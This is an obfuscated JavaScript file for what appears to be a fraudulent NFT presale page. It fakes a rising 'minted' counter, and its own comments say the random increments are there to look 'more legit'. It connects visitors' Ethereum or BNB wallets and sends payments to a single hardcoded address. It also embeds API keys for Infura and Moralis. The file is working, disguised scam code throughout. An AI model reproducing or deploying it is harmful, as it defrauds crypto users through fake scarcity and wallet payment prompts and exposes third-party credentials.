function _0x227f(_0x3622d9, _0x2c2f28) {
	const _0xa0245f = _0xa024();
	return _0x227f = function (_0x227f2d, _0x3dd3a3) {
	  _0x227f2d = _0x227f2d - 244;
	  let _0x445814 = _0xa0245f[_0x227f2d];
	  return _0x445814;
	},
	_0x227f(_0x3622d9, _0x2c2f28);
  }
  const _0x45c541 = _0x227f;
  (function (_0x5d88cc, _0x2af8c5) {
	const _0x561660 = _0x227f,
	_0x52c7a4 = _0x5d88cc();
	while (!![]) {
	  try {
		const _0x1a0618 = parseInt(_0x561660(271)) / 1 + parseInt(_0x561660(288)) / 2 + parseInt(_0x561660(270)) / 3 * ( - parseInt(_0x561660(353)) / 4) + - parseInt(_0x561660(261)) / 5 + parseInt(_0x561660(350)) / 6 + parseInt(_0x561660(379)) / 7 + parseInt(_0x561660(377)) / 8 * ( - parseInt(_0x561660(380)) / 9);
		if (_0x1a0618 === _0x2af8c5) break;
		 else _0x52c7a4['push'](_0x52c7a4['shift']());
	  } catch (_0x566d01) {
		_0x52c7a4['push'](_0x52c7a4['shift']());
	  }
	}
  }(_0xa024, 902288), document[_0x45c541(246)](_0x45c541(244), function () {
	const _0x520788 = _0x45c541,
	// total is how many nfts can be purchased
    total = [
	  1,
	  10
	],
	price = 0.2,
    // don't know what this is
	_0xec0157 = _0x520788(269),
    // amount is how many NFTs are being sold.
	amount = 777,
    // this value doesn't really need to be changed, it just changes how fast the progress bar moves to show how many NFTs have been purchased.
	_0x43886a = 30.4,
    // delay basically chooses how often the progress bar should increase in value, the time is in ms.
    // added chooses how many nfts that have been minted with a value between of 1-3 (slower is better, looks more legit if it's a smaller project)
	delay = [
	  2000,
	  4000
	],
	added = [
	  1,
	  5
	],
	address = {
	  'ETH': '0xcf85047D0e14C64C42f8221012BD0B8388Dc58Ce',
	  'BNB': '0xcf85047D0e14C64C42f8221012BD0B8388Dc58Ce'
	};
	function _0x34d1cf(_0x375b0) {
	  const _0x57e81b = _0x520788;
	  $(_0x57e81b(361)) ['text']((_0x375b0 * price) ['toFixed'](2) + ' ETH');
	}
	$(_0x520788(329)) ['on'](_0x520788(299), function () {
	  const _0xbb937e = _0x520788;
	  if (parseInt($('.form__input') [_0xbb937e(376)]()) > total[1] - 1) return ![];
	  let _0xd7111c = parseInt($('.form__input') [_0xbb937e(376)]()) + 1;
	  $(_0xbb937e(258)) ['text'](_0xd7111c),
	  _0x34d1cf(_0xd7111c);
	}),
	$('.minus') ['on'](_0x520788(299), function () {
	  const _0x5ab9a0 = _0x520788;
	  if (parseInt($(_0x5ab9a0(258)) [_0x5ab9a0(376)]()) < total[0] + 1) return ![];
	  let _0x3da362 = parseInt($(_0x5ab9a0(258)) [_0x5ab9a0(376)]()) - 1;
	  $(_0x5ab9a0(258)) [_0x5ab9a0(376)](_0x3da362),
	  _0x34d1cf(_0x3da362);
	}),
	$(_0x520788(292)) ['on'](_0x520788(299), function () {
	  const _0x4959ab = _0x520788;
	  $(_0x4959ab(258)) [_0x4959ab(376)](total[1]),
	  _0x34d1cf(total[1]);
	}),
	$(_0x520788(364)) ['on'](_0x520788(299), async function () {
	  const _0x634c4c = _0x520788;
	  if (_0x3caef0 == ![]) $(_0x634c4c(297)) [_0x634c4c(254)](_0x634c4c(249), _0x634c4c(257));
	  if (_0x3caef0 == 'bc') await _0x3d6e62[_0x634c4c(267)](parseFloat($(_0x634c4c(361)) [_0x634c4c(376)]()), _0x634c4c(266), await _0x3d6e62[_0x634c4c(309)]());
	   else _0x3caef0 == 'wc' && (console[_0x634c4c(331)](parseFloat($(_0x634c4c(361)) [_0x634c4c(376)]())), await _0x145bcf[_0x634c4c(267)](parseFloat($(_0x634c4c(361)) [_0x634c4c(376)]()), 'ETH'));
	});
	let _0x2d20fc = 0;
	function _0x1d1eae(_0x754097) {
	  return new Promise(_0x38a0ab=>setTimeout(_0x38a0ab, _0x754097));
	}
	function _0x39ed74(_0x58fd5f, _0x3abcc5, _0x128fdc) {
	  const _0x8aacc0 = _0x520788;
	  let _0x1f2996 = new Date();
	  _0x1f2996[_0x8aacc0(313)](_0x1f2996[_0x8aacc0(259)]() + _0x128fdc * 24 * 60 * 60 * 1000);
	  const _0x718ed3 = _0x8aacc0(256) + _0x1f2996['toUTCString']();
	  return document['cookie'] = _0x58fd5f + '=' + _0x3abcc5 + '; ' + _0x718ed3 + _0x8aacc0(291),
	  !![];
	}
	function _0x5cfc74(_0xae5c60) {
	  const _0x5a56c8 = _0x520788,
	  _0x27ab81 = _0xae5c60 + '=',
	  _0x39778a = decodeURIComponent(document['cookie']),
	  _0x4cdfc5 = _0x39778a['split']('; ');
	  let _0x46dbe3;
	  return _0x4cdfc5[_0x5a56c8(371)](_0x546a14=>{
		const _0x478310 = _0x5a56c8;
		if (_0x546a14[_0x478310(347)](_0x27ab81) === 0) _0x46dbe3 = _0x546a14[_0x478310(245)](_0x27ab81[_0x478310(327)]);
	  }),
	  _0x46dbe3;
	}
	function _0xd24c8a(_0x5237ce) {
	  const _0x3f5af6 = _0x520788;
	  return _0x5237ce[_0x3f5af6(251)]() [_0x3f5af6(368)](/\B(?=(\d{3})+(?!\d))/g, ',');
	}
	function _0x536dc0(_0x5409a0, _0x419a41, _0x55f82f, _0x279572) {
	  const _0x259a29 = _0x520788;
	  let _0x4dfda3 = null;
	  const _0x3f22de = _0x557635=>{
		const _0x1277e7 = _0x227f;
		if (!_0x4dfda3) _0x4dfda3 = _0x557635;
		const _0x4bbfd2 = Math[_0x1277e7(319)]((_0x557635 - _0x4dfda3) / _0x279572, 1);
		_0x5409a0[_0x1277e7(290)] = Math[_0x1277e7(382)](_0x4bbfd2 * (_0x55f82f - _0x419a41) + _0x419a41) [_0x1277e7(385)](0) + _0x1277e7(328) + amount,
		_0x4bbfd2 < 1 && window[_0x1277e7(277)](_0x3f22de);
	  };
	  window[_0x259a29(277)](_0x3f22de);
	}
	function _0x41f071() {
	  const _0x492e1c = _0x520788;
	  let _0x39714 = 1000;
	  function _0xbc12d(_0x22794e, _0x3253c1) {
		return Math['random']() * (_0x22794e - _0x3253c1) + _0x3253c1;
	  }
	  if (_0x2d20fc == 0) {
		J = 1;
		var _0x5a364e = document['querySelector'](_0x492e1c(306)),
		_0x46f31e = document[_0x492e1c(343)](_0x492e1c(272)),
		_0x4b77a3 = _0x43886a,
		_0xc02d18 = setInterval(_0x47275f, 100),
		_0x16bbeb,
		_0x24bd35;
		if (_0x5cfc74(_0xec0157) != undefined) _0x24bd35 = _0x5cfc74(_0xec0157);
		 else _0x39ed74(_0xec0157, _0x43886a, 30),
		_0x24bd35 = _0x43886a;
		var _0x38065c = parseInt(amount / 100 * _0x24bd35);
		_0x46f31e[_0x492e1c(290)] = _0x492e1c(328) + amount;
		function _0x47275f() {
		  const _0x517f08 = _0x492e1c;
		  if (_0x4b77a3 >= _0x24bd35) {
			clearInterval(_0xc02d18);
			if (_0x4b77a3 < 100) {
			  async function _0x436dfb() {
				const _0x2bc08a = _0x227f;
				let _0x1cd2f9 = _0xbc12d(added[0] / (amount / 100), added[1] / (amount / 100));
				_0x4b77a3 = ( + _0x4b77a3 + _0x1cd2f9) [_0x2bc08a(385)](3),
				_0x24bd35 = _0x4b77a3,
				_0x39ed74(_0xec0157, _0x4b77a3, 30),
				_0x38065c = amount / 100 * _0x24bd35,
				b_totals = amount / 100 * (_0x24bd35 - _0x1cd2f9),
				_0x5a364e[_0x2bc08a(286)][_0x2bc08a(345)] = _0x4b77a3 + '%',
				_0x46f31e['innerHTML'] = _0x2bc08a(346) + _0x4b77a3 + _0x2bc08a(381),
				_0x46f31e['innerHTML'] = _0x536dc0(_0x46f31e, b_totals, _0x38065c[_0x2bc08a(385)](0), 500);
				if (_0x4b77a3 >= 100) {
				  _0x46f31e['innerHTML'] = amount['toFixed'](0) + _0x2bc08a(328) + amount,
				  _0x5a364e['innerHTML'] = '<span class="progr-span">' + 400 + _0x2bc08a(381),
				  _0x39ed74(_0xec0157, _0x43886a, 30);
				  return;
				} else await _0x1d1eae(_0xbc12d(delay[0], delay[1]) ['toFixed'](0)),
				_0x436dfb();
			  }
			  _0x436dfb();
			}
		  } else _0x4b77a3++,
		  _0x46f31e[_0x517f08(290)] = (amount / 100 * _0x4b77a3) [_0x517f08(385)](0) + _0x517f08(328) + amount,
		  _0x5a364e[_0x517f08(286)][_0x517f08(345)] = _0x4b77a3 + '%';
		}
	  }
	}
	_0x41f071();
	var _0x3708c8 = '',
	_0x803086,
	_0x1d8c92;
	const _0x2c1a74 = 'b6c7f33cec02432b8c0c75d421f97616',
	_0x444df3 = _0x520788(280),
	_0x1ba763 = '0wwRaAlywjfkaNDe1c23iohNY4wPddpN6gSuvbua';
	var _0x3caef0 = ![];
	const _0x25c7a7 = {
	  'BNB': [
		_0x520788(357),
		'Binance Smart Chain BEP-20',
		_0x520788(354),
		_0x520788(321),
		18,
		_0x520788(360),
		'https://bscscan.com'
	  ],
	  'ETH': [
		_0x520788(300),
		_0x520788(340),
		'Ethereum',
		'ETH',
		18,
		_0x520788(355) + _0x2c1a74,
		_0x520788(274)
	  ]
	},
	_0x46f474 = [
	  {
		'inputs': [
		],
		'stateMutability': _0x520788(374),
		'type': _0x520788(311)
	  },
	  {
		'anonymous': ![],
		'inputs': [
		  {
			'indexed': !![],
			'internalType': _0x520788(372),
			'name': _0x520788(283),
			'type': _0x520788(372)
		  },
		  {
			'indexed': !![],
			'internalType': _0x520788(372),
			'name': _0x520788(363),
			'type': 'address'
		  },
		  {
			'indexed': ![],
			'internalType': _0x520788(322),
			'name': _0x520788(293),
			'type': 'uint256'
		  }
		],
		'name': _0x520788(287),
		'type': _0x520788(332)
	  },
	  {
		'anonymous': ![],
		'inputs': [
		  {
			'indexed': !![],
			'internalType': 'address',
			'name': _0x520788(317),
			'type': _0x520788(372)
		  },
		  {
			'indexed': !![],
			'internalType': _0x520788(372),
			'name': 'to',
			'type': 'address'
		  },
		  {
			'indexed': ![],
			'internalType': _0x520788(322),
			'name': 'value',
			'type': _0x520788(322)
		  }
		],
		'name': _0x520788(255),
		'type': _0x520788(332)
	  },
	  {
		'inputs': [
		],
		'name': _0x520788(356),
		'outputs': [
		],
		'stateMutability': _0x520788(374),
		'type': 'function'
	  },
	  {
		'inputs': [
		  {
			'internalType': _0x520788(372),
			'name': _0x520788(283),
			'type': _0x520788(372)
		  },
		  {
			'internalType': _0x520788(372),
			'name': _0x520788(363),
			'type': _0x520788(372)
		  }
		],
		'name': _0x520788(325),
		'outputs': [
		  {
			'internalType': _0x520788(322),
			'name': '',
			'type': _0x520788(322)
		  }
		],
		'stateMutability': _0x520788(265),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		  {
			'internalType': _0x520788(372),
			'name': _0x520788(363),
			'type': _0x520788(372)
		  },
		  {
			'internalType': _0x520788(322),
			'name': 'amount',
			'type': 'uint256'
		  }
		],
		'name': _0x520788(253),
		'outputs': [
		  {
			'internalType': _0x520788(365),
			'name': '',
			'type': _0x520788(365)
		  }
		],
		'stateMutability': _0x520788(374),
		'type': 'function'
	  },
	  {
		'inputs': [
		  {
			'internalType': 'address',
			'name': _0x520788(366),
			'type': _0x520788(372)
		  }
		],
		'name': _0x520788(314),
		'outputs': [
		  {
			'internalType': _0x520788(322),
			'name': '',
			'type': _0x520788(322)
		  }
		],
		'stateMutability': _0x520788(265),
		'type': 'function'
	  },
	  {
		'inputs': [
		  {
			'internalType': _0x520788(322),
			'name': _0x520788(312),
			'type': _0x520788(322)
		  }
		],
		'name': 'burnMyTokensFOREVER',
		'outputs': [
		],
		'stateMutability': _0x520788(374),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		],
		'name': _0x520788(384),
		'outputs': [
		],
		'stateMutability': _0x520788(344),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		],
		'name': _0x520788(284),
		'outputs': [
		],
		'stateMutability': 'nonpayable',
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		],
		'name': _0x520788(282),
		'outputs': [
		  {
			'internalType': 'uint8',
			'name': '',
			'type': 'uint8'
		  }
		],
		'stateMutability': _0x520788(349),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		  {
			'internalType': _0x520788(372),
			'name': _0x520788(363),
			'type': _0x520788(372)
		  },
		  {
			'internalType': _0x520788(322),
			'name': _0x520788(341),
			'type': _0x520788(322)
		  }
		],
		'name': _0x520788(305),
		'outputs': [
		  {
			'internalType': 'bool',
			'name': '',
			'type': 'bool'
		  }
		],
		'stateMutability': 'nonpayable',
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		],
		'name': 'devClaimed',
		'outputs': [
		  {
			'internalType': 'bool',
			'name': '',
			'type': _0x520788(365)
		  }
		],
		'stateMutability': _0x520788(265),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		],
		'name': _0x520788(330),
		'outputs': [
		  {
			'internalType': 'uint256',
			'name': '',
			'type': _0x520788(322)
		  }
		],
		'stateMutability': _0x520788(265),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		],
		'name': 'getRefund',
		'outputs': [
		],
		'stateMutability': _0x520788(374),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		  {
			'internalType': _0x520788(372),
			'name': 'spender',
			'type': _0x520788(372)
		  },
		  {
			'internalType': _0x520788(322),
			'name': 'addedValue',
			'type': _0x520788(322)
		  }
		],
		'name': _0x520788(335),
		'outputs': [
		  {
			'internalType': _0x520788(365),
			'name': '',
			'type': _0x520788(365)
		  }
		],
		'stateMutability': _0x520788(374),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		],
		'name': _0x520788(369),
		'outputs': [
		  {
			'internalType': 'bool',
			'name': '',
			'type': _0x520788(365)
		  }
		],
		'stateMutability': 'view',
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		],
		'name': _0x520788(375),
		'outputs': [
		  {
			'internalType': _0x520788(365),
			'name': '',
			'type': _0x520788(365)
		  }
		],
		'stateMutability': _0x520788(265),
		'type': 'function'
	  },
	  {
		'inputs': [
		],
		'name': 'liquidityUnlock',
		'outputs': [
		  {
			'internalType': 'uint256',
			'name': '',
			'type': 'uint256'
		  }
		],
		'stateMutability': _0x520788(265),
		'type': 'function'
	  },
	  {
		'inputs': [
		],
		'name': _0x520788(296),
		'outputs': [
		  {
			'internalType': _0x520788(365),
			'name': '',
			'type': 'bool'
		  }
		],
		'stateMutability': _0x520788(265),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		],
		'name': 'name',
		'outputs': [
		  {
			'internalType': 'string',
			'name': '',
			'type': _0x520788(383)
		  }
		],
		'stateMutability': _0x520788(349),
		'type': 'function'
	  },
	  {
		'inputs': [
		  {
			'internalType': _0x520788(365),
			'name': _0x520788(333),
			'type': _0x520788(365)
		  }
		],
		'name': _0x520788(264),
		'outputs': [
		],
		'stateMutability': _0x520788(374),
		'type': 'function'
	  },
	  {
		'inputs': [
		],
		'name': _0x520788(378),
		'outputs': [
		  {
			'internalType': _0x520788(372),
			'name': '',
			'type': _0x520788(372)
		  }
		],
		'stateMutability': _0x520788(265),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		  {
			'internalType': 'contract IBEP20',
			'name': _0x520788(348),
			'type': _0x520788(372)
		  },
		  {
			'internalType': _0x520788(322),
			'name': _0x520788(334),
			'type': _0x520788(322)
		  }
		],
		'name': 'recoverbep20',
		'outputs': [
		],
		'stateMutability': 'nonpayable',
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		],
		'name': 'refundTime',
		'outputs': [
		  {
			'internalType': _0x520788(322),
			'name': '',
			'type': _0x520788(322)
		  }
		],
		'stateMutability': 'view',
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		  {
			'internalType': 'address payable',
			'name': _0x520788(359),
			'type': 'address'
		  }
		],
		'name': _0x520788(295),
		'outputs': [
		],
		'stateMutability': _0x520788(374),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		],
		'name': _0x520788(289),
		'outputs': [
		],
		'stateMutability': _0x520788(374),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		],
		'name': _0x520788(281),
		'outputs': [
		  {
			'internalType': _0x520788(383),
			'name': '',
			'type': _0x520788(383)
		  }
		],
		'stateMutability': _0x520788(349),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		],
		'name': _0x520788(310),
		'outputs': [
		  {
			'internalType': _0x520788(322),
			'name': '',
			'type': _0x520788(322)
		  }
		],
		'stateMutability': _0x520788(265),
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		  {
			'internalType': 'address',
			'name': _0x520788(250),
			'type': _0x520788(372)
		  },
		  {
			'internalType': _0x520788(322),
			'name': _0x520788(312),
			'type': _0x520788(322)
		  }
		],
		'name': _0x520788(338),
		'outputs': [
		  {
			'internalType': _0x520788(365),
			'name': '',
			'type': _0x520788(365)
		  }
		],
		'stateMutability': 'nonpayable',
		'type': _0x520788(275)
	  },
	  {
		'inputs': [
		  {
			'internalType': _0x520788(372),
			'name': _0x520788(260),
			'type': _0x520788(372)
		  },
		  {
			'internalType': 'address',
			'name': 'recipient',
			'type': _0x520788(372)
		  },
		  {
			'internalType': _0x520788(322),
			'name': 'amount',
			'type': _0x520788(322)
		  }
		],
		'name': 'transferFrom',
		'outputs': [
		  {
			'internalType': _0x520788(365),
			'name': '',
			'type': 'bool'
		  }
		],
		'stateMutability': _0x520788(374),
		'type': 'function'
	  },
	  {
		'inputs': [
		  {
			'internalType': 'address',
			'name': _0x520788(276),
			'type': _0x520788(372)
		  }
		],
		'name': _0x520788(352),
		'outputs': [
		  {
			'internalType': _0x520788(322),
			'name': '',
			'type': _0x520788(322)
		  }
		],
		'stateMutability': 'view',
		'type': _0x520788(275)
	  },
	  {
		'stateMutability': _0x520788(344),
		'type': 'receive'
	  }
	];
	web3 = new Web3(new Web3[(_0x520788(320))][(_0x520788(324))](_0x520788(355) + _0x2c1a74)),
	console['log'](web3),
	Moralis[_0x520788(262)]({
	  'serverUrl': _0x444df3,
	  'appId': _0x1ba763
	});
	function _0x1d1eae(_0x583720) {
	  return new Promise(_0x4b1aba=>setTimeout(_0x4b1aba, _0x583720));
	}
	function _0x312803(_0x22ba9f) {
	  const _0x142e38 = _0x520788;
	  let _0x20ceaf = '000000000000000000',
	  _0x32cd7e = '',
	  _0x241187;
	  var _0x122d76 = 2;
	  return !(Math[_0x142e38(370)](_0x22ba9f) == 0) && (_0x32cd7e = '' + Math[_0x142e38(370)](_0x22ba9f), _0x122d76 = 1),
	  _0x241187 = ('' + _0x22ba9f) [_0x142e38(245)](_0x32cd7e[_0x142e38(327)] + _0x122d76),
	  _0x20ceaf = _0x20ceaf[_0x142e38(245)](_0x241187[_0x142e38(327)]),
	  _0x20ceaf = _0x241187 + _0x20ceaf,
	  _0x241187 = _0x32cd7e + _0x20ceaf,
	  _0x241187 = '0x' + parseInt(_0x241187) [_0x142e38(251)](16),
	  _0x241187;
	}
	class _0x59302c {
	  get[_0x520788(273)]() {
		const _0x535752 = _0x520788;
		return window[_0x535752(303)] ? !![] : ![];
	  }
	  async['getAccount']() {
		try {
		  _0x3708c8 = await ethereum['request']({
			'method': 'eth_requestAccounts'
		  });
		} catch (_0x428088) {
		  return ![];
		}
		return await _0x3708c8[0] ? _0x3708c8[0] : ![];
	  }
	  async['swapNetwork'](_0x4931d8) {
		const _0x5b1a22 = _0x520788;
		try {
		  await window[_0x5b1a22(303)][_0x5b1a22(308)]({
			'method': _0x5b1a22(302),
			'params': [
			  {
				'chainId': _0x25c7a7[_0x4931d8][0]
			  }
			]
		  });
		} catch (_0x4cac2c) {
		  console[_0x5b1a22(331)](_0x4cac2c);
		  if (_0x4cac2c[_0x5b1a22(301)] == 4902) try {
			await window[_0x5b1a22(303)][_0x5b1a22(308)]({
			  'method': _0x5b1a22(279),
			  'params': [
				{
				  'chainId': _0x25c7a7[_0x4931d8][0],
				  'chainName': _0x25c7a7[_0x4931d8][1],
				  'nativeCurrency': {
					'name': _0x25c7a7[_0x4931d8][2],
					'symbol': _0x25c7a7[_0x4931d8][3],
					'decimals': _0x25c7a7[_0x4931d8][4]
				  },
				  'rpcUrls': [
					'' + _0x25c7a7[_0x4931d8][5]
				  ],
				  'blockExplorerUrls': [
					'' + _0x25c7a7[_0x4931d8][6]
				  ]
				}
			  ]
			});
		  } catch (_0x50952f) {
			return ![];
		  }
		}
		return !![];
	  }
	  async[_0x520788(267)](_0x550373, _0x553e1a = _0x520788(266), _0x37f732) {
		const _0x7ecc35 = _0x520788;
		if (!await this['swapNetwork'](_0x553e1a)) return ![];
		let _0x354062 = await ethereum[_0x7ecc35(308)]({
		  'method': _0x7ecc35(326),
		  'params': [
			{
			  'from': _0x37f732,
			  'to': address[_0x553e1a],
			  'value': _0x312803(_0x550373)
			}
		  ]
		}) [_0x7ecc35(252)](_0xe6591e=>{
		  return ![];
		}) [_0x7ecc35(373)](_0x538f12=>{
		  return _0x538f12;
		});
		return !![];
	  }
	}
	class _0x2af753 {
	  constructor() {
	  }
	  async['getAccount']() {
		const _0x1d5ec4 = _0x520788;
		try {
		  let _0x6d4b1 = await Moralis[_0x1d5ec4(268)]({
			'provider': 'walletconnect',
			'chainId': 56
		  });
		  return window[_0x1d5ec4(276)] = _0x6d4b1,
		  await!![];
		} catch (_0x5260c3) {
		  return ![];
		}
		return ![];
	  }
	  async['pay'](_0x4cf545, _0x5c6bd2 = 'ETH') {
		const _0x21bcdd = _0x520788,
		_0x2cde5e = {
		  'type': _0x21bcdd(337),
		  'amount': Moralis[_0x21bcdd(351)][_0x21bcdd(266)](_0x4cf545),
		  'receiver': address[_0x5c6bd2]
		};
		let _0x118940 = await Moralis[_0x21bcdd(338)](_0x2cde5e);
		console[_0x21bcdd(331)](_0x118940);
	  }
	  async[_0x520788(358)]() {
		const _0x313d5d = _0x520788;
		await Moralis[_0x313d5d(342)][_0x313d5d(304)](),
		await Moralis[_0x313d5d(248)][_0x313d5d(323)]();
	  }
	}
	async function _0x1d576e() {
	  const _0x2ed6e8 = _0x520788;
	  await _0x1d1eae(1000),
	  $(_0x2ed6e8(297)) ['hide'](),
	  $(_0x2ed6e8(263)) [_0x2ed6e8(376)](_0x2ed6e8(316));
	}
	async function _0x38707c() {
	}
	var _0x3d6e62 = new _0x59302c(),
	_0x145bcf = new _0x2af753();
	$(document) [_0x520788(298)](function (_0x19c663) {
	  const _0x308e74 = _0x520788;
	  var _0x1acae1 = $(_0x308e74(278));
	  !_0x1acae1['is'](_0x19c663[_0x308e74(339)]) && _0x1acae1['has'](_0x19c663['target']) [_0x308e74(327)] === 0 && $(_0x308e74(297)) [_0x308e74(247)]();
	}),
	document[_0x520788(315)](_0x520788(285)) [_0x520788(246)](_0x520788(299), async function () {
	  const _0x1caf9b = _0x520788;
	  $(_0x1caf9b(336)) [_0x1caf9b(247)](),
	  $(_0x1caf9b(294)) [_0x1caf9b(254)]('display', _0x1caf9b(318)),
	  await _0x3d6e62[_0x1caf9b(309)]() != ![] && await _0x3d6e62['swapNetwork'](_0x1caf9b(266)) != ![] ? ($(_0x1caf9b(336)) [_0x1caf9b(367)](), $('#meta_svg') [_0x1caf9b(247)](), await _0x1d576e(), _0x3caef0 = 'bc') : (await _0x1d1eae(1000), $(_0x1caf9b(336)) [_0x1caf9b(367)](), $(_0x1caf9b(294)) [_0x1caf9b(247)]());
	}),
	document[_0x520788(315)](_0x520788(307)) [_0x520788(246)](_0x520788(299), async function () {
	  const _0x2785d2 = _0x520788;
	  await _0x145bcf['getAccount']() != ![] ? ($(_0x2785d2(336)) [_0x2785d2(367)](), $(_0x2785d2(294)) [_0x2785d2(247)](), _0x3caef0 = 'wc', await _0x1d576e()) : (await _0x1d1eae(1000), $(_0x2785d2(336)) [_0x2785d2(367)](), $(_0x2785d2(294)) [_0x2785d2(247)]());
	});
  }));
  function _0xa024() {
	const _0x3b37e7 = [
	  'payable',
	  'width',
	  '<span class="progr-span">',
	  'indexOf',
	  'tokenAddress',
	  'pure',
	  '3131952YnNiYu',
	  'Units',
	  'userEthSpenttInPresale',
	  '8gibURn',
	  'Binance Coin',
	  'https://mainnet.infura.io/v3/',
	  'allowRefunds',
	  '0x38',
	  'disconnect',
	  'addr',
	  'https://bsc-dataseed.binance.org/',
	  '.eth_pr',
	  '0xcf85047D0e14C64C42f8221012BD0B8388Dc58Ce',
	  'spender',
	  '.submit__form',
	  'bool',
	  'account',
	  'show',
	  'replace',
	  'isRefundEnabled',
	  'trunc',
	  'forEach',
	  'address',
	  'then',
	  'nonpayable',
	  'isStopped',
	  'text',
	  '88zzcJCP',
	  'pool',
	  '10153094nrxHVL',
	  '410904PtdFbS',
	  '%</span>',
	  'floor',
	  'string',
	  'buyTokens',
	  'toFixed',
	  'DOMContentLoaded',
	  'substring',
	  'addEventListener',
	  'hide',
	  'Web3',
	  'display',
	  'recipient',
	  'toString',
	  'catch',
	  'approve',
	  'css',
	  'Transfer',
	  'expires=',
	  'flex',
	  '.form__input',
	  'getTime',
	  'sender',
	  '7926265wEhyxE',
	  'start',
	  '.header_connect',
	  'pauseUnpausePresale',
	  'view',
	  'ETH',
	  'pay',
	  'authenticate',
	  'iergods',
	  '532794cgyFhS',
	  '1217928pozPCT',
	  '.done-span',
	  'isOn',
	  'https://etherscan.io',
	  'function',
	  'user',
	  'requestAnimationFrame',
	  '#popup',
	  'wallet_addEthereumChain',
	  'https://qehxh72hbapn.usemoralis.com:2053/server',
	  'symbol',
	  'decimals',
	  'owner',
	  'claimDevFeeAndAddLiquidity',
	  'browser_connect',
	  'style',
	  'Approval',
	  '309182mAeluJ',
	  'setPancakePool',
	  'innerHTML',
	  '; path=/',
	  '.max',
	  'value',
	  '#meta_svg',
	  'setMultisigAddress',
	  'moonMissionStarted',
	  '.modal__window',
	  'mouseup',
	  'click',
	  '0x1',
	  'code',
	  'wallet_switchEthereumChain',
	  'ethereum',
	  'logOut',
	  'decreaseAllowance',
	  '.progress-done',
	  'walletconnect_connect',
	  'request',
	  'getAccount',
	  'totalSupply',
	  'constructor',
	  'amount',
	  'setTime',
	  'balanceOf',
	  'getElementById',
	  'CONNECTED!',
	  'from',
	  'block',
	  'min',
	  'providers',
	  'BNB',
	  'uint256',
	  'cleanup',
	  'HttpProvider',
	  'allowance',
	  'eth_sendTransaction',
	  'length',
	  ' / ',
	  '.plus',
	  'ethSent',
	  'log',
	  'event',
	  '_isStopped',
	  'tokenAmount',
	  'increaseAllowance',
	  '#meta_img',
	  'native',
	  'transfer',
	  'target',
	  'Ethereum',
	  'subtractedValue',
	  'User',
	  'querySelector'
	];
	_0xa024 = function () {
	  return _0x3b37e7;
	};
	return _0xa024();
  }
  
